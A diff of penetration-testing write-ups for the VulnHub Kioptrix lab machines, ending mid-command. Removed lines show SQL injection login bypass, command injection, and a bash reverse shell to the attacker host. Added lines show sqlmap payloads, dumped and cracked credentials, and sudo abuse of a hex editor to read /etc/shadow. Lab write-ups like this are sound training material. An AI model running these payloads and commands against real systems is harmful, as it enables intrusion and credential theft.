@@ -1,420 +1,329 @@
 # Kioptrix Level 1.2 | VulnHub
-https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
+https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
 
 ### 1. Scan
 ```bash
-kali@kali:~/Desktop/osc$ nmap -A -T4 -p- 10.1.1.58
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 02:23 EDT
-Nmap scan report for 10.1.1.58
-Host is up (0.0060s latency).
-Not shown: 65528 closed ports
-PORT     STATE SERVICE    VERSION
-22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
+kali@kali:~$ nmap -A -T4 -p- kioptrix3.com
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 02:47 EDT
+Nmap scan report for kioptrix3.com (10.1.1.7)
+Host is up (0.0030s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
 | ssh-hostkey: 
-|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
-|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
-|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
-|_sshv1: Server supports SSHv1
-80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
-|_http-server-header: Apache/2.0.52 (CentOS)
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
-111/tcp  open  rpcbind    2 (RPC #100000)
-443/tcp  open  ssl/https?
-|_ssl-date: 2020-10-27T03:15:04+00:00; -3h09m34s from scanner time.
-| sslv2: 
-|   SSLv2 supported
-|   ciphers: 
-|     SSL2_DES_192_EDE3_CBC_WITH_MD5
-|     SSL2_RC2_128_CBC_WITH_MD5
-|     SSL2_RC4_128_EXPORT40_WITH_MD5
-|     SSL2_DES_64_CBC_WITH_MD5
-|     SSL2_RC4_128_WITH_MD5
-|     SSL2_RC4_64_WITH_MD5
-|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
-621/tcp  open  status     1 (RPC #100024)
-631/tcp  open  ipp        CUPS 1.1
-| http-methods: 
-|_  Potentially risky methods: PUT
-|_http-server-header: CUPS/1.1
-|_http-title: 403 Forbidden
-3306/tcp open  mysql      MySQL (unauthorized)
-
-Host script results:
-|_clock-skew: -3h09m34s
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Ligoat Security - Got Goat? Security ...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 109.43 seconds
+Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds
 ```
-The machine is running SSH, Apache on port 80 and 443, and this time there is a CUPS 1.1 and MySQL server.
+The machine is running SSH and Apache.
 
-### 2. Investigate the web server
-This time, accessing the HTTP server gets a simple login form. The HTTPS version of the site errors out due to an invalid certificate, so for now this will be my focus. The login form does not present any errors to the user if invalid input is entered. Despite this, SQL injection can be attempted.
-
-### 3. Get past the login page
-Using a basic SQL injection payload of `' OR '1='1`, it is possible to bypass the login form.
-```
-POST /index.php HTTP/1.1
-Host: 10.1.1.58
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://10.1.1.58/index.php
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 52
-Connection: close
-Upgrade-Insecure-Requests: 1
-
-uname=admin&psw=%27+OR+%271%27%3D%271&btnLogin=Login
-```
-This gives access to a single textbox that prompts us for an IP address to ping. Entering an IP and hitting the button will return the results in a new window. So for example, entering the address of my attacker machine:
-```
-10.1.1.74
-
-PING 10.1.1.74 (10.1.1.74) 56(84) bytes of data.
-64 bytes from 10.1.1.74: icmp_seq=0 ttl=64 time=0.427 ms
-64 bytes from 10.1.1.74: icmp_seq=1 ttl=64 time=0.630 ms
-64 bytes from 10.1.1.74: icmp_seq=2 ttl=64 time=1.01 ms
-
---- 10.1.1.74 ping statistics ---
-3 packets transmitted, 3 received, 0% packet loss, time 2000ms
-rtt min/avg/max/mdev = 0.427/0.692/1.019/0.245 ms, pipe 2
-```
-Basically this is returning the results of the ping command. As this is a PHP application, it is most likely making a call to system or shell_exec with a parameter to accomplish this, which means command injection may be possible.
+### 2. Check out the web server
+The website is fairly simple with a few pages - a blog, photo gallery and a login form. The gallery CMS is apparently custom. Starting out there, it is clear the gallery is based on a database backend, and images can be sorted by various columns in those tables. Firstly identify an injectable parameter:
 ```bash
-10.1.1.74; whoami
+kali@kali:~/Desktop$ sqlmap -r gallery.request 
+        ___
+       __H__                                                                                                                                                                                        
+ ___ ___[)]_____ ___ ___  {1.4.8#stable}                                                            
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|                                 
+      |_|V...       |_|   http://sqlmap.org                                                                                                                                                         
 
-PING 10.1.1.74 (10.1.1.74) 56(84) bytes of data.
-64 bytes from 10.1.1.74: icmp_seq=0 ttl=64 time=0.983 ms
-64 bytes from 10.1.1.74: icmp_seq=1 ttl=64 time=0.730 ms
-64 bytes from 10.1.1.74: icmp_seq=2 ttl=64 time=0.708 ms
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
---- 10.1.1.74 ping statistics ---
-3 packets transmitted, 3 received, 0% packet loss, time 2002ms
-rtt min/avg/max/mdev = 0.708/0.807/0.983/0.124 ms, pipe 2
-apache
+[*] starting @ 02:59:10 /2020-10-28/
+
+[02:59:10] [INFO] parsing HTTP request from 'gallery.request'
+[02:59:10] [INFO] testing connection to the target URL
+[02:59:11] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+[02:59:11] [INFO] checking if the target is protected by some kind of WAF/IPS
+[02:59:11] [INFO] testing if the target URL content is stable
+[02:59:11] [INFO] target URL content is stable
+[02:59:11] [INFO] testing if GET parameter 'id' is dynamic
+[02:59:11] [INFO] GET parameter 'id' appears to be dynamic
+[02:59:11] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:59:11] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[02:59:11] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[02:59:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:59:40] [WARNING] reflective value(s) found and filtering out
+[02:59:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:59:41] [INFO] GET parameter 'id' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --code=500)
+[02:59:41] [INFO] testing 'Generic inline queries'
+[02:59:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:59:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:59:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:59:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:59:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:59:41] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:59:41] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[02:59:41] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[02:59:41] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:59:41] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:59:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:59:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:59:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:59:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:59:41] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:59:41] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[02:59:41] [INFO] GET parameter 'id' is 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' injectable 
+[02:59:41] [INFO] testing 'MySQL inline queries'
+[02:59:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[02:59:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[02:59:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[02:59:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:59:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[02:59:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[02:59:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[02:59:52] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[02:59:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[02:59:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[02:59:52] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[02:59:52] [INFO] target URL appears to have 6 columns in query
+[02:59:52] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (7374=7374) THEN 1 ELSE (SELECT 8244 UNION SELECT 4159) END))&sort=photoid
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=1 OR ROW(2109,2434)>(SELECT COUNT(*),CONCAT(0x7170717871,(SELECT (ELT(2109=2109,1))),0x717a6b7171,FLOOR(RAND(0)*2))x FROM (SELECT 2212 UNION SELECT 5634 UNION SELECT 1480 UNION SELECT 9609)a GROUP BY x)&sort=photoid
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 5080 FROM (SELECT(SLEEP(5)))QsQi)&sort=photoid
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7170717871,0x664a707568684747494d4764767967637763556c726a6c4a6b4e71574a4668795856417a65585862,0x717a6b7171),NULL,NULL,NULL,NULL-- -&sort=photoid
+---
+[02:59:57] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 4.1
+[02:59:57] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 21 times
+[02:59:57] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/kioptrix3.com'
+
+[*] ending @ 02:59:57 /2020-10-28/
+
 ```
-As can be seen here, this is indeed the case. With this information we now effectively have a means to interact with the machine.
+With an injectable parameter, I can then dump out all database information with `--dump-all`. This includes the gallery database.
+Among the dumped database tables is a dev_accounts table with two users and hashed passwords.
+```bash
+kali@kali:~/Desktop/osc/kiol3/gallery$ cat dev_accounts.csv 
+id,password,username
+1,0d3cfbec887aabd50f243b3f155c0f85,dreg
+2,5badcaf789d3d1d09794d8f021f40f0e,loneferret
+```
+The first user hash doesn't crack, however the second hash cracks to a plaintext password of `starwars`.
+Also there is another table called gallarific_users with a single row.
+```bash
+kali@kali:~/Desktop/osc/kiol3/gallery$ cat gallarific_users.csv 
+userid,email,photo,website,joincode,lastname,password,username,usertype,firstname,datejoined,issuperuser
+1,<blank>,<blank>,<blank>,<blank>,User,n0t7t1k4,admin,superuser,Super,1302628616,1
+```
+Together, these tables provide two sets of complete credentials:
+- `loneferret:starwars`
+- `admin:n0t7t1k4`
+  
+Unfortunately, none of these credentials work with the main login form available from the site page. However, if the gallery is running it's own CMS, then it would most likely have a seperate login page as well. By viewing the source code on a gallery page, a commented out link to kioptrix3.com/gallery/gadmin/ directs me to a second login form.
+
+### 3. Get admin access to the gallery.
+Though we have two accounts to try, it makes sense to start with the one which is designated as a superuser. This succeeds. Now we have access to the photo gallery administration pages, which allows a user to upload photos and organise galleries.
 
 ### 4. Get a shell
-Start up a listener on the attacker machine:
+Additionally, I can take the other set of credentials for loneferret and use them to login to the machine over SSH.
 ```bash
-kali@kali:~$ nc -lvnp 9999
-Listening on 0.0.0.0 9999
+kali@kali:~/Desktop/osc/kiol3/gallery$ ssh loneferret@kioptrix3.com
+The authenticity of host 'kioptrix3.com (10.1.1.7)' can't be established.
+RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'kioptrix3.com,10.1.1.7' (RSA) to the list of known hosts.
+loneferret@kioptrix3.com's password: 
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
+loneferret@Kioptrix3:~$ whoami
+loneferret
+````
+I now have two forms of access on the machine, though a shell is way better.
+
+### 5. Enumerate from user
+There are two files in the user's home directory.
+```bash
+loneferret@Kioptrix3:~$ ls
+checksec.sh  CompanyPolicy.README
+loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
+Hello new employee,
+It is company policy here to use our newly installed software for editing, creating and viewing files.
+Please use the command 'sudo ht'.
+Failure to do so will result in you immediate termination.
+
+DG
+CEO
+
+loneferret@Kioptrix3:~$ cat checksec.sh 
+#!/bin/bash
+#
+# The BSD License (http://www.opensource.org/licenses/bsd-license.php) 
+# specifies the terms and conditions of use for checksec.sh:
+#
+# Copyright (c) 2009-2011, Tobias Klein.
+# All rights reserved.
+#
+# Redistribution and use in source and binary forms, with or without 
+# modification, are permitted provided that the following conditions 
+# are met:
+# 
+# * Redistributions of source code must retain the above copyright 
+#   notice, this list of conditions and the following disclaimer.
+# * Redistributions in binary form must reproduce the above copyright 
+#   notice, this list of conditions and the following disclaimer in 
+#   the documentation and/or other materials provided with the 
+#   distribution.
+# * Neither the name of Tobias Klein nor the name of trapkit.de may be 
+#   used to endorse or promote products derived from this software 
+#   without specific prior written permission.
+#
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 
+# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT 
+# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS 
+# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE 
+# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, 
+# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, 
+# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS 
+# OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED 
+# AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, 
+# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF 
+# THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH 
+# DAMAGE.
+#
+# Name    : checksec.sh
+# Version : 1.4
+# Author  : Tobias Klein
+# Date    : January 2011
+# Download: http://www.trapkit.de/tools/checksec.html
+# Changes : http://www.trapkit.de/tools/checksec_changes.txt
+#
+# Description:
+#
+# Modern Linux distributions offer some mitigation techniques to make it 
+# harder to exploit software vulnerabilities reliably. Mitigations such 
+# as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout 
+# Randomization (ASLR) and Position Independent Executables (PIE) have 
+# made reliably exploiting any vulnerabilities that do exist far more 
+# challenging. The checksec.sh script is designed to test what *standard* 
+# Linux OS and PaX (http://pax.grsecurity.net/) security features are being 
+# used.
+#
+# As of version 1.3 the script also lists the status of various Linux kernel 
+# protection mechanisms.
+#
+# Credits:
+#
+# Thanks to Brad Spengler (grsecurity.net) for the PaX support.
+# Thanks to Jon Oberheide (jon.oberheide.org) for the kernel support.
+# 
+# Others that contributed to checksec.sh (in no particular order):
+#
+# Simon Ruderich, Denis Scherbakov, Stefan Kuttler, Radoslaw Madej,
+# Anthony G. Basile. 
+#
+
+# global vars
+have_readelf=1
+verbose=false
 ```
-Then make a reverse shell payload using bash which is present on the machine.
+Checking sudo permissions, the user does indeed have sudo access to Ht. Ht is a file/hex editor, and since we have root access to it with no password I can use it to modify files on the system as root.
 ```bash
-10.1.1.74; bash -i >& /dev/tcp/10.1.1.74/9999 0>&1
+loneferret@Kioptrix3:~$ sudo -l         
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
 ```
-Catch the shell.
+So one thing I can try is checking out the shadow file.
 ```bash
-kali@kali:~$ nc -lvnp 9999
-Listening on 0.0.0.0 9999
-Connection received on 10.1.1.58 49606
-bash: no job control in this shell
-bash-3.00$ whoami
-apache
+loneferret@Kioptrix3:~$ sudo ht /etc/shadow
+Error opening terminal: xterm-256color.
+loneferret@Kioptrix3:~$ export TERM=xterm  
+loneferret@Kioptrix3:~$ sudo ht /etc/shadow
 ```
-
-### 5. Enumerate from foothold
-The first thing to do when logged in as the web user is enumerate the website files.
-```bash
-bash-3.00$ ls
-index.php
-pingit.php
-bash-3.00$ cat index.php
-<?php
-        mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
-        //print "Connected to MySQL<br />";
-        mysql_select_db("webapp");
-
-        if ($_POST['uname'] != ""){
-                $username = $_POST['uname'];
-                $password = $_POST['psw'];
-                $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
-                //print $query."<br>";
-                $result = mysql_query($query);
-
-                $row = mysql_fetch_array($result);
-                //print "ID: ".$row['id']."<br />";
-        }
-
-?>
-<html>
-<body>
-<?php
-if ($row['id']==""){
-?>
-<form method="post" name="frmLogin" id="frmLogin" action="index.php">
-        <table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
-                <tr>
-                        <td colspan='2' align='center'>
-                        <b>Remote System Administration Login</b>
-                        </td>
-                </tr>
-                <tr>
-                        <td width="150">Username</td>
-                        <td><input name="uname" type="text"></td>
-                </tr>
-                <tr>
-                        <td width="150">Password</td>
-                        <td>
-                        <input name="psw" type="password">
-                        </td>
-                </tr>
-                <tr>
-                        <td colspan="2" align="center">
-                        <input type="submit" name="btnLogin" value="Login">
-                        </td>
-                </tr>
-        </table>
-</form>
-<?php
-        } //END of login form
-?>
-
-<!-- Start of HTML when logged in as Administator -->
-<?php
-        if ($row['id']==1){
-?>
-        <form name="ping" action="pingit.php" method="post" target="_blank">
-                <table width='600' border='1'>
-                <tr valign='middle'>
-                        <td colspan='2' align='center'>
-                        <b>Welcome to the Basic Administrative Web Console<br></b>
-                        </td>
-                </tr>
-                <tr valign='middle'>
-                        <td align='center'>
-                                Ping a Machine on the Network:
-                        </td>
-                                <td align='center'>
-                                <input type="text" name="ip" size="30">
-                                <input type="submit" value="submit" name="submit">
-                        </td>
-                        </td>
-                </tr>
-        </table>
-        </form>
-
-
-<?php
-}
-?>
-</body>
-</html>
+This opens the file, and I can get root's hash/salt:
 ```
-Here we get the credentials used by the web server for mySQL: `john:hiroshima`
-```bash
-bash-3.00$ cat pingit.php
-<?php
-
-print $_POST['ip'];
-if (isset($_POST['submit'])){
-        $target = $_REQUEST[ 'ip' ];
-        echo '<pre>';
-        echo shell_exec( 'ping -c 3 ' . $target );
-        echo '</pre>';
-    }
-?>
-```
-As expected, the web app used a simple shell_exec with a parameter given by user input. Not good!
-  
-Next, lets check out the SQL server.
-```bash
-bash-3.00$ python -c 'import pty; pty.spawn("/bin/bash")'
-bash-3.00$ mysql -u john -p
-mysql -u john -p
-Enter password: hiroshima
-
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 53 to server version: 4.1.22
-
-Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
-
-mysql> show databases;
-show databases;
-+----------+
-| Database |
-+----------+
-| mysql    |
-| test     |
-| webapp   |
-+----------+
-3 rows in set (0.00 sec)
-
-mysql>
-```
-I'll start with webapp and work up.
-```bash
-mysql> use webapp; show tables;
-use webapp; show tables;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-+------------------+
-| Tables_in_webapp |
-+------------------+
-| users            |
-+------------------+
-1 row in set (0.00 sec)
-
-mysql> select * from users;
-select * from users;
-+------+----------+------------+
-| id   | username | password   |
-+------+----------+------------+
-|    1 | admin    | 5afac8d85f |
-|    2 | john     | 66lajGGbla |
-+------+----------+------------+
-2 rows in set (0.00 sec)
-
-mysql>
-```
-This gives us two more sets of credentials: `admin:5afac8d85f` and `john:66lajGGbla`. Now we can check out the other database, test.
-```bash
-mysql> use test; show tables;
-use test; show tables;
-Database changed
-Empty set (0.00 sec)
-
-mysql>
-```
-This database is empty unfortunately. Finally we can check out the default MySQL database.
-```bash
-mysql> use mysql; show tables;
-use mysql; show tables;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-+---------------------------+
-| Tables_in_mysql           |
-+---------------------------+
-| columns_priv              |
-| db                        |
-| func                      |
-| help_category             |
-| help_keyword              |
-| help_relation             |
-| help_topic                |
-| host                      |
-| tables_priv               |
-| time_zone                 |
-| time_zone_leap_second     |
-| time_zone_name            |
-| time_zone_transition      |
-| time_zone_transition_type |
-| user                      |
-+---------------------------+
-15 rows in set (0.00 sec)
-
-mysql> select * from user;
-select * from user;
-+-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
-| Host                  | User | Password         | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections |
-+-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
-| localhost             | root | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                |          |            |             |              |             0 |           0 |               0 |
-| localhost.localdomain | root | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                |          |            |             |              |             0 |           0 |               0 |
-| localhost.localdomain |      |                  | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
-| localhost             |      |                  | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
-| localhost             | john | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
-+-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
-5 rows in set (0.00 sec)
-
-mysql>
-```
-Within this table there is another user/password combo of `root:5a6914ba69e02807`. Despite all these credentials, none of them appear to be valid for actual user accounts on the machine, so this is a dead end for now.
-
-### 6. Enumerate further
-I'll use an enumeration script to gather more information on the machine. (see linenum_out.txt).
-```bash
-cd /tmp
-wget http://10.1.1.74:8000/LinEnum.sh
---00:31:01--  http://10.1.1.74:8000/LinEnum.sh
-           => `LinEnum.sh'
-Connecting to 10.1.1.74:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 46,631 (46K) [text/x-sh]
-
-100%[====================================>] 46,631        --.--K/s             
-
-00:31:01 (59.29 MB/s) - `LinEnum.sh' saved [46631/46631]
-bash LinEnum.sh
-
-#########################################################
-# Local Linux Enumeration & Privilege Escalation Script #
-#########################################################
-# www.rebootuser.com
-# version 0.982
-
-[-] Debug Info
-[+] Thorough tests = Disabled
-
-
-Scan started at:
-Tue Oct 27 00:31:20 EDT 2020                                                                                                                                                                        
-                                                                                                                                                                                                    
-
-### SYSTEM ##############################################
-[-] Kernel information:
-Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
-
-
-[-] Kernel information (continued):
-Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007
-
-
-[-] Specific release information:
-CentOS release 4.5 (Final)
-
-
-[-] Hostname:
-kioptrix.level2
-...
-```
-This script consists of mostly just commands that can be ran manually, but having them in a script saves some time. Some of the more in-depth scripts wouldn't work on this machine due to incompatabilities with the version of bash. In any case, looking through the output, the use of CentOS 4.5 (released in 2007) warrented some investigation. There are some kernel exploits for this version, in in particular stood out - Ring0 privesc using ip_append_data(): https://www.exploit-db.com/exploits/9542.
-
-### 7. Set up the exploit
-In order to exploit, the program has to be compiled and ran locally. This can be done as the machine already has gcc installed. So it's just a matter of retrieving the file, hosting it, wgetting it onto the machine and compiling.
-```bash
-kali@kali:~/Desktop/osc/kiol2$ wget https://www.exploit-db.com/raw/9542 -O ring0exploit.c
---2020-10-27 03:56:47--  https://www.exploit-db.com/raw/9542
-Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
-Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 2643 (2.6K) [text/plain]
-Saving to: ‘ring0exploit.c’
-
-ring0exploit.c                                   100%[==========================================================================================================>]   2.58K  --.-KB/s    in 0s      
-
-2020-10-27 03:56:49 (51.8 MB/s) - ‘ring0exploit.c’ saved [2643/2643]
-
-kali@kali:~/Desktop/osc/kiol2$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:0:99999:7:::
 ```
 
-### 8. Escalate to root
-On the CentOS machine:
+### 6. Try to crack root hash
 ```bash
-wget http://10.1.1.74:8000/ring0exploit.c
---00:49:49--  http://10.1.1.74:8000/ring0exploit.c
-           => `ring0exploit.c'
-Connecting to 10.1.1.74:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 2,643 (2.6K) [text/plain]
+kali@kali:~/Desktop/osc/kiol3$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt root.hash 
+[sudo] password for kali: 
